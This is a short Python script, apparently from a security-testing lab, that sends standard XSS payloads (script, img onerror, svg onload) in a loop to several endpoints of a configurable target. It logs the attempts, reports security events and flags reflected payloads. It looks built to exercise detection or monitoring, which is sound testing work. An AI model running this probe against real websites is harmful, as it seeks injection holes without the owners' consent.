import requests
import time
import logging
import os
from bs4 import BeautifulSoup
import sys
sys.path.append('/attack/common')
from event_sender import send_security_event

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TARGET_HOST = os.getenv('TARGET_HOST', 'target_proxy')
TARGET_PORT = os.getenv('TARGET_PORT', '80')
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

ENDPOINTS = ["/", "/monitoring", "/security"]
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
]

def perform_xss_attack():
    while True:
        for endpoint in ENDPOINTS:
            for payload in XSS_PAYLOADS:
                try:
                    data = {"comment": payload, "message": payload}
                    response = requests.post(f"{TARGET_URL}{endpoint}", data=data)
                    logger.info(f"XSS attempt on {endpoint} with payload {payload}: {response.status_code}")
                    
                    # Отправляем событие безопасности
                    send_security_event('XSS', response.request.headers.get('X-Real-IP', 'unknown'),
                                     f"Endpoint: {endpoint}, Payload: {payload}")
                    
                    # Проверка ответа на наличие отраженного XSS
                    soup = BeautifulSoup(response.text, 'html.parser')
                    if payload in response.text:
                        logger.warning(f"Potential XSS vulnerability found on {endpoint}")
                        
                except Exception as e:
                    logger.error(f"Error during XSS attack: {e}")
                time.sleep(5)

if __name__ == "__main__":
    logger.info("Starting XSS attacks...")
    perform_xss_attack() 